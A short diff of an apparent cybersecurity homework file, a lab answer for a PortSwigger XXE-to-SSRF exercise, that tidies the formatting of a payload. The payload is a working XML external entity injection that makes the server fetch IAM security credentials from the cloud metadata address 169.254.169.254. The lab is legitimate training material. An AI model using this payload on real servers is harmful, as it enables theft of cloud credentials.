@@ -18,7 +18,7 @@ Attacks on the server
 
 4) (https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf )
 Відповідь : https://github.com/redbersdev/cybersecurity_homework11/blob/main/photo_2023-07-07_23-28-43.jpg
-payload: ( <?xml version="1.0" encoding="UTF-8"?>
+payload:  <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE random [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
-<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>)
+<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
 
